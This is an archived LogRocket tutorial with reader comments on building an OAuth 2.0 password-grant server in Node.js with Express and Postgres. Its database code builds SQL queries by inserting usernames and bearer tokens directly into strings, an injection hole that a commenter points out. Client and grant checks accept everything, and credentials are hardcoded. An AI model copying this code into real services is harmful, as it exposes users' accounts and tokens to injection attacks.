=== Content from archive.ph_3e57a767_20250115_093816.html ===


| [archive.todaywebpage capture](https://archive.today/) | Saved from | | no other snapshots from this url |  | | --- | --- | | 17 Aug 2022 17:20:06 UTC |
| --- | --- | --- | --- | --- | --- |
| All snapshots | **from host** [blog.logrocket.com](https://archive.ph/blog.logrocket.com) | |
| [Webpage](https://archive.ph/VlGDa)[Screenshot](https://archive.ph/VlGDa/image) | |
| [share](https://archive.ph/VlGDa/share)[download .zip](https://archive.ph/download/VlGDa.zip)[report bug or abuse](https://archive.ph/VlGDa/abuse)[Buy me a coffee](http://buymeacoffee.com/ghostpolitics) | |

[![](data:image/svg+xml;base64...)](https://archive.ph/VlGDa)RedditVKontakteTwitterPinboardLivejournalshort linklong linkmarkdownhtml code<a href="http://archive.today/VlGDa">
<img style="width:300px;height:200px;background-color:white" src="https://archive.ph/VlGDa/d957dcc8f542a0e96748379c51dd3ce2edd2872d/scr.png"><br>
How to implement OAuth 2.0 in Node.js - LogRocket Blog<br>
archived 17 Aug 2022 17:20:06 UTC
</a>wiki code{{cite web
| title = How to implement OAuth 2.0 in Node.js - LogRocket Blog
| url = https://blog.logrocket.com/implement-oauth-2-0-node-js/
| date = 2022-08-17
| archiveurl = http://archive.today/VlGDa
| archivedate = 2022-08-17 }}
[###### Can't get enough? Subscribe to The Replay, our weekly newsletter →](https://archive.ph/o/VlGDa/https%3A//lp.logrocket.com/subscribe-thereplay)

[![LogRocket Blog](/VlGDa/b68c14c50d89fb38f503cdd416899f71f512026e.avif)](https://archive.ph/o/VlGDa/https%3A//logrocket.com/)

* Blog
  [Dev](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/)[Product Management](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/product-management)
* [Podcast](https://archive.ph/o/VlGDa/https%3A//podrocket.logrocket.com/)
* [Meetups](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/tech-meetups/)

* [Sign In](https://archive.ph/o/VlGDa/https%3A//app.logrocket.com/)
* [Start monitoring for free](https://archive.ph/o/VlGDa/https%3A//logrocket.com/signup/)

Share

Reply

* [6](#comments)

[![](/VlGDa/bcd8ffc6927c90625b9cf38fcf925fab757f6a3e.avif)](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/author/diogosouza/)

[Diogo Souza Follow](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/author/diogosouza/)
Brazilian dev. Creator of [altaluna.com.br](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/implement-oauth-2-0-node-js/www.altaluna.com.br)

# How to implement OAuth 2.0 in Node.js

##

March 23, 2022
·
9 min read
2683

![How Implement 0auth2 Nodejs](/VlGDa/957b69a15bc7209310e721598cd120437b415c8f.avif)
***Editor’s note**: This article was last updated on 6 April 2022 to reflect the most up-to-date versions of Express and Node.js.*
Everybody’s talking about [OAuth 2.0](https://archive.ph/o/VlGDa/https%3A//oauth.net/2/). Regardless of the size of the company you work for or the number of services and APIs you’re running in the background, there’s a good chance you need OAuth 2.0 if you aren’t already using it.
Given the huge amount of information, tools, and frameworks available, it can be really hard to understand and easily apply the protocol to your projects. When it comes to JavaScript, and more specifically, Node.js, it also depends on factors like the server you’re choosing and whether it already provides OAuth 2.0 support. It’s also important to consider the maturity of the project, the docs, and the community.
We can simplify this issue with [node-oauth2-server](https://archive.ph/o/VlGDa/https%3A//github.com/oauthjs/node-oauth2-server), a framework-agnostic module for implementing an OAuth 2 server in Node.js. node-oauth2-server is open sourced, simple, and easy to integrate with your Node apps, even if they’ve already been running for a while.
Although the repo hasn’t been updated for some time, it is still completely compatible with the latest Node.js standards at the time of writing.
In this article, we’ll explore the OAuth 2 framework by developing our own overwritten implementation and testing it through a real API. We’ll also integrate it with a Postgres database to see the project in action, blocking and allowing access to a specific endpoint.
For simplicity, our example will explore the [password grant type](https://archive.ph/o/VlGDa/https%3A//oauth.net/2/grant-types/password/) of OAuth 2. Based on this example, you can adapt the implementation to other types. You can review [the full source code for this example](https://archive.ph/o/VlGDa/https%3A//github.com/atharvadeosthale/logrocket-oauth2-article). Let’s get started!

* [About OAuth 2.0](#about-oauth-2)
* [Setting up our project](#setting-up-project)
* [Database layer](#database-layer)
* [OAuth 2.0 service and routes](#oauth2-service-routes)
  + [Creating a new user via Postman](#creating-new-user-postman)
  + [Login created user via Postman](#login-created-user-postman)
  + [Postman Authorization tab](#postman-authorization-tab)
* [Conclusion](#conclusion)

## About OAuth 2.0

Within its docs, you can find the official [Model Specification](https://archive.ph/o/VlGDa/https%3A//oauth2-server.readthedocs.io/en/latest/model/spec.html) that describes how your JavaScript code must override the default OAuth 2 functions to provide your customized authentication experience:
```
const model = {
  // We support returning promises.
  getAccessToken: function() {
    return new Promise('works!');
  },

  // Or, calling a Node-style callback.
  getAuthorizationCode: function(done) {
    done(null, 'works!');
  },

  // Or, using generators.
  getClient: function*() {
    yield somethingAsync();
    return 'works!';
  },

  // Or, async/wait (using Babel).
  getUser: async function() {
    await somethingAsync();
    return 'works!';
  }
};

const OAuth2Server = require('oauth2-server');
let oauth = new OAuth2Server({model: model});
```
With the OAuth2Server object in hand, you can override the default OAuth 2 provider of your Express server, enabling you to provide your own authentication experience. For more info on how the framework works behind the scenes, please refer to the [official docs](https://archive.ph/o/VlGDa/https%3A//oauth2-server.readthedocs.io/en/latest/docs/getting-started.html).
## Setting up our project

First, let’s install all the required tools and dependencies for our project. Make sure you have [Postgres installed](https://archive.ph/o/VlGDa/https%3A//www.postgresql.org/) on your respective OS. After you’ve successfully installed Postgres, create a new database called `logrocket_oauth2` with the following command:

---

[![](/VlGDa/80b9f1868d7bba161c8c31f1674a70be0107c08e.avif)

## Over 200k developers use LogRocket to create better digital experiences

![](data:image/avif;base64...)Learn more →](https://archive.ph/o/VlGDa/https%3A//lp.logrocket.com/blg/learn-more)

---

```
CREATE DATABASE logrocket_oauth2;
```
To create our user and access token tables, run the following SQL command:
```
CREATE TABLE public.users
(
    id serial,
    username text,
    user_password text,
    PRIMARY KEY (id)
)
WITH (
    OIDS = FALSE
);

ALTER TABLE public.users
    OWNER to postgres;

CREATE TABLE public.access_tokens
(
    id serial,
    access_token text,
    user_id integer,
    PRIMARY KEY (id)
)
WITH (
    OIDS = FALSE
);

ALTER TABLE public.access_tokens
    OWNER to postgres;
```
Make sure you replace `postgres` with your own Postgres username. We’ve mostly simplified the tables, so in this article, we won’t cover columns related to creating to updating date times.
Next, create a new folder in the directory of your choice called `logrocket-oauth2-example` and run the `npm init -y` command to initialize it with your `package.json` file. Then, run the following command to install the required dependencies:
```
npm install express pg node-oauth2-server
```
We use Express to create REST APIs, pg, short for node-postgres, to connect our Node.js server to PostgreSQL, and finally, `node-oauth2-server` to provide relevant utilities that help us make the OAuth 2 server.
If you prefer, you can also run the commands using Yarn with the code below:
```
yarn add express pg node-oauth2-server
```
Finally, be sure to reproduce the following folder structure:
![Oauth2 Folder Structure Node](/VlGDa/95656faa90b8463b952615faadea820f2021ee46.avif)

---

### More great articles from LogRocket:

* Don't miss a moment with [The Replay](https://archive.ph/o/VlGDa/https%3A//lp.logrocket.com/subscribe-thereplay), a curated newsletter from LogRocket
* Use React's useEffect [to optimize your application's performance](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/understanding-react-useeffect-cleanup-function/)
* Switch between [multiple versions of Node](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/switching-between-node-versions-during-development/)
* [Learn how to animate](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/animate-react-app-animxyz/) your React app with AnimXYZ
* [Explore Tauri](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/rust-solid-js-tauri-desktop-app/), a new framework for building binaries
* Compare [NestJS vs. Express.js](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/nestjs-vs-express-js/)
* [Discover](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/best-typescript-orms/) popular ORMs used in the TypeScript landscape

---

## Database layer

Now, let’s move on to the database setup. After you’ve successfully created the database and tables, we’ll need a Postgres wrapper to encapsulate the queries we’ll make in the `db` folder. Inside the `db` folder, add the following code to the `pgWrapper.js` file:
```
const Pool = require("pg").Pool;
function query(queryString, cbFunc) {
  const pool = new Pool({
    user: "postgres",
    host: "localhost",
    database: "logrocket_oauth2",
    password: "postgres",
    port: 5432,
  });
  pool.query(queryString, (error, results) => {
    cbFunc(setResponse(error, results));
  });
}
function setResponse(error, results) {
  return {
    error: error,
    results: results ? results : null,
  };
}
module.exports = {
  query,
};
```
The most important part of this code is the `query()` function. Instead of throwing the Postgres connection pool object everywhere, we’re going to centralize it in this file and export the function.
It’s pretty simple. The `query()` function is made of a new pg `Pool` instance and a callback function that, in turn, will always receive a JSON object composed of `error` and `results` properties. Let’s keep `results` as an array for simplicity.
> Note: Be sure to change the database properties to yours.

Next, we’ll need two repositories that will handle the database operations for both users and tokens. The first one will be the `userDB.js` file:
```
let pgPool;

module.exports = (injectedPgPool) => {
    pgPool = injectedPgPool;

    return {
        register,
        getUser,
        isValidUser,
    };
};

var crypto = require("crypto");

function register(username, password, cbFunc) {
    var shaPass = crypto.createHash("sha256").update(password).digest("hex");

    const query = `INSERT INTO users (username, user_password) VALUES ('${username}', '${shaPass}')`;

    pgPool.query(query, cbFunc);
}

function getUser(username, password, cbFunc) {
    var shaPass = crypto.createHash("sha256").update(password).digest("hex");

    const getUserQuery = `SELECT * FROM users WHERE username = '${username}' AND user_password = '${shaPass}'`;

    pgPool.query(getUserQuery, (response) => {
        cbFunc(
            false,
            response.results && response.results.rowCount === 1
                ? response.results.rows[0]
                : null
        );
    });
}

function isValidUser(username, cbFunc) {
    const query = `SELECT * FROM users WHERE username = '${username}'`;

    const checkUsrcbFunc = (response) => {
        const isValidUser = response.results
            ? !(response.results.rowCount > 0)
            : null;

        cbFunc(response.error, isValidUser);
    };

    pgPool.query(query, checkUsrcbFunc);
}
```
Our database model is going to resume three operations, the registration, searching, and validation of a user.
Note that we’re injecting the `pgPool` in the beginning of the file that we created before. For this code to work, we still need to pass the param to the constructor in the `index.js` file.
Each function deals with our previously created `query` function. [The npm pg package](https://archive.ph/o/VlGDa/https%3A//www.npmjs.com/package/pg) receives the query itself as the first argument. The `error-results` composition is the second argument, which contains the result of our execution.
We’re injecting the params via the `${}` operator to simplify the concatenation. However, you can also use [parameterized queries](https://archive.ph/o/VlGDa/https%3A//node-postgres.com/features/queries) by passing the values as an array in the second optional argument of the `query` function.
Finally, the pg package returns the values in the `results` object, but there isn’t any `length` property, which differs from other databases like MySQL.
To see if any results are coming, we need to access the `rowCount` property. Note that we’re passing around a lot of callback functions to avoid having the control under the function returns, making the whole architecture async. Feel free to adapt this to your own style.
Now, let’s go to the `tokenDB.js` implementation:
```
let pgPool;

module.exports = (injectedPgPool) => {
    pgPool = injectedPgPool;

    return {
        saveAccessToken,
        getUserIDFromBearerToken,
    };
};

function saveAccessToken(accessToken, userID, cbFunc) {
    const getUserQuery = `INSERT INTO access_tokens (access_token, user_id) VALUES ('${accessToken}', ${userID});`;

    pgPool.query(getUserQuery, (response) => {
        cbFunc(response.error);
    });
}

function getUserIDFromBearerToken(bearerToken, cbFunc) {
    const getUserIDQuery = `SELECT * FROM access_tokens WHERE access_token = '${bearerToken}';`;

    pgPool.query(getUserIDQuery, (response) => {
        const userID =
            response.results && response.results.rowCount == 1
                ? response.results.rows[0].user_id
                : null;

        cbFunc(userID);
    });
}
```
Like in our previous JavaScript file, we’re injecting the pg `Pool` in the constructor and calling the respective queries.
Pay special attention to the `getUserIDFromBearerToken` function. Attending to the default `node-oauth2-server` model contract, we need to provide a function that will evaluate if the given bearer token is actually valid, meaning that the token actually exists in the database.
Thanks to the previous `isValidUser` from `userDB.js`, which checks for username duplicity when inserting a new user, our token will work.
## OAuth 2.0 service and routes

Now that the database layer is ready to be called, let’s implement the services and routes we need, starting with the `tokenService.js` file:
```
let userDB;
let tokenDB;

module.exports = (injectedUserDB, injectedTokenDB) => {
    userDB = injectedUserDB;
    tokenDB = injectedTokenDB;

    return {
        getClient,
        saveAccessToken,
        getUser,
        grantTypeAllowed,
        getAccessToken,
    };
};

function getClient(clientID, clientSecret, cbFunc) {
    const client = {
        clientID,
        clientSecret,
        grants: null,
        redirectUris: null,
    };

    cbFunc(false, client);
}

function grantTypeAllowed(clientID, grantType, cbFunc) {
    cbFunc(false, true);
}

function getUser(username, password, cbFunc) {
    userDB.getUser(username, password, cbFunc);
}

function saveAccessToken(accessToken, clientID, expires, user, cbFunc) {
    tokenDB.saveAccessToken(accessToken, user.id, cbFunc);
}

function getAccessToken(bearerToken, cbFunc) {
    tokenDB.getUserIDFromBearerToken(bearerToken, (userID) => {
        const accessToken = {
            user: {
                id: userID,
            },
            expires: null,
        };

        cbFunc(userID === null, userID === null ? null : accessToken);
    });
}
```
It sounds a bit more complex than it actually is. All of these functions are simply overwritten versions of the Model Specification contract we saw earlier.
For each of its default actions, we need to provide our own implementation that calls our database repository to save a new user, as well as a new access token to retrieve them or get the client application.
For the `grantTypeAllowed` function, we’re actually just recalling the callback function passed as a third argument, passed by the `node-oauth2-server` framework.
We validate if the given client ID has real access to this grant type, set to password only. You can add as many validations as you want. We can also integrate it with other private validation APIs that you or your company may have.
Now, let’s review the `authenticator.js` file code:
```
let userDB;

module.exports = (injectedUserDB) => {
    userDB = injectedUserDB;

    return {
        registerUser,
        login,
    };
};

function registerUser(req, res) {
    userDB.isValidUser(req.body.username, (error, isValidUser) => {
        if (error || !isValidUser) {
            const message = error
                ? "Something went wrong!"
                : "This user already exists!";

            sendResponse(res, message, error);

            return;
        }

        userDB.register(req.body.username, req.body.password, (response) => {
            sendResponse(
                res,
                response.error === undefined ? "Success!!" : "Something went wrong!",
                response.error
            );
        });
    });
}

function login(query, res) {}

function sendResponse(res, message, error) {
    res.status(error !== undefined ? 400 : 200).json({
        message: message,
        error: error,
    });
}
```
In the code above, we have the two main authentication methods, one for the user registration and the other for the user login. Whenever an attempt to register a user is made, we first need to make sure it’s valid, meaning it’s not a duplicate, then register it.
We’ve already seen the validation and saving functions. Now, it’s just a single call. In turn, the `login` function doesn’t need to have any implementation because it’s going to call the framework default flow. In the end, check for whether we had an error or a success for each request so that we can set the proper HTTP response code.
Finally, we need to set up our Express routes in the `routes.js` file:
```
module.exports = (router, app, authenticator) => {
    router.post("/register", authenticator.registerUser);
    router.post("/login", app.oauth.grant(), authenticator.login);

    return router;
};
```
Simple, isn’t it? The only difference is that we’re calling the Express `oauth` function `grant()` to make sure this user is logged in properly. To assure that the implementation is fully working, we’ll also need a safe test endpoint. It’ll be created like any other endpoint, but protected, meaning that only authorized users can have access to it by sending a valid bearer token.
Add the following code to our `testAPIService.js`:
```
module.exports = {
    helloWorld: helloWorld,
};

function helloWorld(req, res) {
    res.send("Hello World OAuth2!");
}
```
Now, add the code below to the `testAPIRoutes.js`:
```
module.exports = (router, app, testAPIService) => {
    router.post("/hello", app.oauth.authorise(), testAPIService.helloWorld);

    return router;
};
```
Last but not least, we need to set up the `index.js` mappings:
```
// Database imports
const pgPool = require("./db/pgWrapper");
const tokenDB = require("./db/tokenDB")(pgPool);
const userDB = require("./db/userDB")(pgPool);
// OAuth imports
const oAuthService = require("./auth/tokenService")(userDB, tokenDB);
const oAuth2Server = require("node-oauth2-server");
// Express
const express = require("express");
const app = express();
app.oauth = oAuth2Server({
    model: oAuthService,
    grants: ["password"],
    debug: true,
});
const testAPIService = require("./test/testAPIService.js");
const testAPIRoutes = require("./test/testAPIRoutes.js")(
    express.Router(),
    app,
    testAPIService
);
// Auth and routes
const authenticator = require("./auth/authenticator")(userDB);
const routes = require("./auth/routes")(
    express.Router(),
    app,
    authenticator
);
app.use(express.json())
app.use(express.urlencoded({ extended: true }));
app.use(app.oauth.errorHandler());
app.use("/auth", routes);
app.use("/test", testAPIRoutes);
const port = 3000;
app.listen(port, () => {
    console.log(`listening on port ${port}`);
});
```
We’re basically importing all the required modules, as well as injecting the corresponding ones into each other.
Pay special attention to the Express settings. Notice that we’re overwriting the default `oauth` object of Express with our own implementation, as well as defining the grant type and the model service.
Then, we must assign the routes for the authenticator and the tests to the Express Router so that Express understands how to redirect each of the approaching requests.
Now, let’s test our endpoints. We’ll use the [Postman tool](https://archive.ph/o/VlGDa/https%3A//www.postman.com/) because it’s simple and practical, however, you should feel free to use one of your choice. Then, start the server by running the following code:
```
node index.js
```
First, we need to create a new user. To do so, perform a `POST` request to `[http://localhost:3000/auth/register/](https://archive.ph/o/VlGDa/localhost%3A3000/auth/register/)` with the following body params encoded as `x-www-form-urlencoded`:
![Postman Create New User Endpoints](/VlGDa/1a9a376d2800d701bdcc012cf3bf7a9d60d4a9b1.avif)
### Creating a new user via Postman

Go ahead and check if the user was successfully created in your database.
With a valid user in hand, you can now log in by sending another `POST` request to `[http://localhost:3000/auth/login/](https://archive.ph/o/VlGDa/localhost%3A3000/auth/login/)` with the following body params:
![Check User Created Success](/VlGDa/288df8ed370743d17a81905bb08a0cb9c353b656.avif)
### Login created user in via Postman

If you change the credentials to invalid ones, you’ll get a message reading `OAuth2Error: User credentials are invalid`.
Now, with OAuth 2 implemented and working, we can run our most important test, validating our secure endpoint. Postman provides us with special features to test this, the Authorization tab:
![Postman Authorization Tab](/VlGDa/1521c47d1dd3574c0e11ea917c9c0d1d582da484.avif)
### Postman Authorization tab

By selecting the **Authorization** tab, you get access to some interesting test features, like the type of authorization flow your API is using, which is `OAuth 2.0` in our case.
You’ll also be able to choose where exactly Postman should place the authorization data. For example, select the **header** option to place the authorization data to the request header or body.
Additionally, you have two options of where to retrieve the access tokens. You can explicitly drop the token text into the available `textarea`, or click the **Get NewAccess Token** button that will, in turn, open a dialog modal with some more fields. Those fields will ask for the access token URL endpoint to get new ones, the TTL, grant type, etc.
Here, you can preview the request. After clicking the button, the inputted values will be automatically translated to the header and body configurations of the current request. This way, you don’t have to manually change each header every time you need to run a new request.
Click the **Send button** and the `Hello World OAuth2` will appear as a result.
## Conclusion

This framework is just one of the options available out there. You can go to the [OAuth.net](https://archive.ph/o/VlGDa/https%3A//oauth.net/code/nodejs/) project and check out the latest recommendations for Node.js and your preferred language as well. Of course, there’s a lot to see.
OAuth 2.0 is a huge protocol that deserves more time and attention when reading and applying its specifications. However, this simple introduction will allow you to understand how the framework works along with Express and Postgres.
You can also change the server and the database to switch your needs. Just make sure to use the same contract we’ve established so far. I hope you enjoyed this article. Happy coding!
## 200’s only Monitor failed and slow network requests in production

Deploying a Node-based web app or website is the easy part. Making sure your Node instance continues to serve resources to your app is where things get tougher. If you’re interested in ensuring requests to the backend or third party services are successful, [try LogRocket](https://archive.ph/o/VlGDa/https%3A//logrocket.com/signup/). [![LogRocket Network Request Monitoring](/VlGDa/9da17f32005d0755341f1006ceb8a7906676bb9e.avif)](https://archive.ph/o/VlGDa/https%3A//logrocket.com/signup/)[https://logrocket.com/signup/](https://archive.ph/o/VlGDa/https%3A//logrocket.com/signup/)[LogRocket](https://archive.ph/o/VlGDa/https%3A//logrocket.com/signup/) is like a DVR for web and mobile apps, recording literally everything that happens while a user interacts with your app. Instead of guessing why problems happen, you can aggregate and report on problematic network requests to quickly understand the root cause. LogRocket instruments your app to record baseline performance timings such as page load time, time to first byte, slow network requests, and also logs Redux, NgRx, and Vuex actions/state. [Start monitoring for free](https://archive.ph/o/VlGDa/https%3A//logrocket.com/signup/).

### Share this:

* [Twitter](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/implement-oauth-2-0-node-js/?share=twitter&nb=1 "Click to share on Twitter")
* [Reddit](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/implement-oauth-2-0-node-js/?share=reddit&nb=1 "Click to share on Reddit")
* [LinkedIn](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/implement-oauth-2-0-node-js/?share=linkedin&nb=1 "Click to share on LinkedIn")
* [Facebook](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/implement-oauth-2-0-node-js/?share=facebook&nb=1 "Click to share on Facebook")

![](data:image/gif;base64...)
[Diogo Souza Follow](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/author/diogosouza/)
Brazilian dev. Creator of [altaluna.com.br](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/implement-oauth-2-0-node-js/www.altaluna.com.br)

* [Uncategorized](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/category/uncategorized/)

* [#node](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/tag/node/)

« [Create a custom React alert message](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/create-custom-react-alert-message/)
[How to create simple and gradient borders in Flutter](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/how-to-create-simple-gradient-borders-flutter/) »

![](/VlGDa/4e03ab12fd045c626efb220c8b7ad0fd1ec0fbf8.avif)
![](/VlGDa/22a59ebc3be46af3b9913631cee4719e8969a1e5.avif)
![](/VlGDa/b68c14c50d89fb38f503cdd416899f71f512026e.avif)
## Stop guessing why bugs happen with LogRocket

[Get started for free](https://archive.ph/o/VlGDa/https%3A//logrocket.com/signup)

## [How to implement redirects in Next.js](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/redirects-next-js/)

[![](/VlGDa/24561ed140fa105e736babba266912347e67ae7f.avif)](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/author/madarsbiss/)

[Madars Bišs](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/author/madarsbiss/)

Aug 17, 2022
·
7 min read

## [Build a full stack app with Next.js and Supabase](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/build-full-stack-app-next-js-supabase/)

[![](/VlGDa/b32688fa7f4f4c3bcadd322dfc9d570ff42290d5.avif)](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/author/taofiqaiyelabegan/)

[Taofiq Aiyelabegan](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/author/taofiqaiyelabegan/)

Aug 17, 2022
·
14 min read

## [Building a draggable slider in React](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/building-draggable-slider-react/)

[![](/VlGDa/3aeb0504795591070d8a8ef5bcf20caa7b315108.avif)](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/author/pelumiakintokun/)

[Pelumi Akintokun](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/author/pelumiakintokun/)

Aug 17, 2022
·
8 min read

## 6 Replies to “How to implement OAuth 2.0 in Node.js”

1. ![](data:image/jpeg;base64...) **pichu** says:
   [June 11, 2020 at 12:01 am](#comment-2806)

   HI , I getting “OAuth2Error: User credentials are invalid” . I am sure that both user name and password correct

   [Reply**](#comment-2806)
2. ![](data:application/json;base64...) **Thura Aung** says:
   [July 17, 2020 at 4:23 am](#comment-3190)

   Very straight forward and effective. Thank you very much.

   [Reply**](#comment-3190)
3. ![](data:image/jpeg;base64...) **[Raul](https://archive.ph/o/VlGDa/https%3A//github.com/raulcejas04)** says:
   [December 27, 2020 at 9:42 pm](#comment-4721)

   Hi, I am in the “most important test” [http://localhost:3000/test/hello](https://archive.ph/o/VlGDa/localhost%3A3000/test/hello) and I get error because new version of postman is a bit different. Can you post a curl script with all paramaters please ?

   [Reply**](#comment-4721)
4. ![](data:image/jpeg;base64...) **[raul](https://archive.ph/o/VlGDa/https%3A//www.github.com/raulcejas04)** says:
   [December 28, 2020 at 4:24 pm](#comment-4730)

   I hope it can help somebody, to test [http://localhost:3000/test/hello](https://archive.ph/o/VlGDa/localhost%3A3000/test/hello) you must use postman 7.36.1 and the code to test it is

   curl –location –request POST ‘http://localhost:3000/test/hello’ \

   –header ‘Authorization: Bearer 9bc8aefc932074166cada3cb1234705824e6e6ad’
   put token that you get in the previous step.

   [Reply**](#comment-4730)
5. ![](/VlGDa/8ec587b31d430871642a84f2ee8b6f959708aa14.jpg) **[octogonz](https://archive.ph/o/VlGDa/https%3A//octogonz.wordpress.com/)** says:
   [May 19, 2021 at 2:29 pm](#comment-6844)

   This is a string injection security vulnerability:
   \_\_\_\_\_\_\_\_\_\_\_

   function getUserIDFromBearerToken(bearerToken, cbFunc) {

   const getUserIDQuery = `SELECT \* FROM access\_tokens WHERE access\_token = ‘${bearerToken}’;`;

   \_\_\_\_\_\_\_\_\_\_\_
   Don’t use this code. Parameterized SQL queries are the reliable way to escape a string.

   [Reply**](#comment-6844)
6. ![](data:image/jpeg;base64...) **[Abel Lifaefi Mbula](https://archive.ph/o/VlGDa/https%3A//abelmbula.com/)** says:
   [December 17, 2021 at 11:55 am](#comment-9484)

   Hey!
   Thank you for your effort and time writing this post. However, the post is a kind of bad example of OAuth 2.0 protocol that we find on the web. We should notice that OAuth 2.0 is an authorization protocol, not an authentication one, although many developers try to use it for that purpose.
   You can find the spec here: [https://oauth.net/2/](https://archive.ph/o/VlGDa/https%3A//oauth.net/2/). Some useful links to visit:
   \* [https://dev.to/kimmaida/authorization-and-authentication-for-everyone-27j3](https://archive.ph/o/VlGDa/https%3A//dev.to/kimmaida/authorization-and-authentication-for-everyone-27j3)

   \* [https://newbedev.com/why-is-it-a-bad-idea-to-use-plain-oauth2-for-authentication](https://archive.ph/o/VlGDa/https%3A//newbedev.com/why-is-it-a-bad-idea-to-use-plain-oauth2-for-authentication)

   \* [https://auth0.com/docs/authorization/protocols/protocol-oauth2](https://archive.ph/o/VlGDa/https%3A//auth0.com/docs/authorization/protocols/protocol-oauth2)

   \* [https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2](https://archive.ph/o/VlGDa/https%3A//www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2)

   \* [https://dev.to/bam92/oauth-2-spec-is-misunderstood-why-14jd](https://archive.ph/o/VlGDa/https%3A//dev.to/bam92/oauth-2-spec-is-misunderstood-why-14jd)

   [Reply**](#comment-9484)

### Leave a Reply [Cancel reply](#respond)

Fill in your details below or click an icon to log in:

 [![Gravatar](data:image/png;base64...)](https://archive.ph/o/VlGDa/https%3A//gravatar.com/site/signup/)
Email (required) (Address never made public)

Name (required)

Website

Save my name, email, and website in this browser for the next time I comment.

![WordPress.com Logo](data:image/png;base64...)

You are commenting using your WordPress.com account.
( Log Out /
Change )

![Twitter picture](data:image/png;base64...)

You are commenting using your Twitter account.
( Log Out /
Change )

![Facebook photo](data:image/gif;base64...)

You are commenting using your Facebook account.
( Log Out /
Change )

Cancel
Connecting to %s

 Notify me of new comments via email. Notify me of new posts via email.

Δ

## Hi there! Would you be interested in a virtual meetup on using Chrome as an IDE?

X

* Yeah
* No

If you are a human seeing this field, please leave it empty.

[Sign up here](https://archive.ph/o/VlGDa/https%3A//blog.logrocket.com/should-you-use-chrome-as-your-ide/)

SearchSearch

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](data:image/gif;base64...)\*First Name:\*Last Name:\*Email Address:Submit
## This page is used by Marketo Forms 2 to proxy cross domain AJAX requests.

| [0%](#0%) |
| --- |
|  |
| [10%](#10%) |
|  |
| [20%](#20%) |
|  |
| [30%](#30%) |
|  |
| [40%](#40%) |
|  |
| [50%](#50%) |
|  |
| [60%](#60%) |
|  |
| [70%](#70%) |
|  |
| [80%](#80%) |
|  |
| [90%](#90%) |
|  |
| [100%](#100%) |

![](https://109.78.161.61.ie.PIN11.317312218.pixel.archive.ph/x.gif)
![](//top-fwz1.mail.ru/counter?id=2825109;js=na)


=== Content from blog.logrocket.com_4950c1cf_20250115_093818.html ===


[###### Advisory boards aren’t only for executives. Join the LogRocket Content Advisory Board today →](https://lp.logrocket.com/blg/content-advisory-board-signup)

[![LogRocket blog logo](https://blog.logrocket.com/wp-content/themes/logrocket/assets/logrocket-logo.png)](https://logrocket.com)

* [Blog](https://blog.logrocket.com/)
  + [Dev](https://blog.logrocket.com/dev)
  + [Product Management](https://blog.logrocket.com/product-management)
  + [UX Design](https://blog.logrocket.com/ux-design)
  + [Podcast](https://podrocket.logrocket.com)
* [Features](https://logrocket.com/features)
* Solutions
  + [Solve User-Reported Issues](https://logrocket.com/solutions/solve-user-issues)
  + [Find Issues Faster](https://logrocket.com/solutions/find-issues-faster)
  + [Optimize Conversion and Adoption](https://logrocket.com/solutions/optimize-conversion-adoption)

* [Start Monitoring for Free](https://lp.logrocket.com/blg/signup)
* [Sign In](https://app.logrocket.com/)

2022-03-23
2683
#node
Diogo Souza
18542

Mar 23, 2022 ⋅ 9 min read
# How to implement OAuth 2.0 in Node.js

[![](https://blog.logrocket.com/wp-content/uploads/2019/04/diogosouza.jpeg?w=150&h=150&crop=1)](https://blog.logrocket.com/author/diogosouza/)
[Diogo Souza](https://blog.logrocket.com/author/diogosouza/)
Brazilian dev. Creator of [altaluna.com.br](https://www.altaluna.com.br/)

Table of contents

* [About OAuth 2.0](https://blog.logrocket.com/implement-oauth-2-0-node-js/#about-oauth-2)
* [Setting up our project](https://blog.logrocket.com/implement-oauth-2-0-node-js/#setting-up-project)
* [Database layer](https://blog.logrocket.com/implement-oauth-2-0-node-js/#database-layer)
* [OAuth 2.0 service and routes](https://blog.logrocket.com/implement-oauth-2-0-node-js/#oauth2-service-routes)
  + [Creating a new user via Postman](https://blog.logrocket.com/implement-oauth-2-0-node-js/#creating-new-user-postman)
  + [Login created user in via Postman](https://blog.logrocket.com/implement-oauth-2-0-node-js/#login-created-user-postman)
  + [Postman Authorization tab](https://blog.logrocket.com/implement-oauth-2-0-node-js/#postman-authorization-tab)
* [Conclusion](https://blog.logrocket.com/implement-oauth-2-0-node-js/#conclusion)

![LogRocket Galileo logo](https://blog.logrocket.com/wp-content/uploads/2023/12/GalileoAIPreview.png)

Introducing Galileo AI

LogRocket’s Galileo AI watches every session, surfacing impactful user struggle and key behavior patterns.

[READ THE
BLOG POST](https://blog.logrocket.com/galileo-ai)

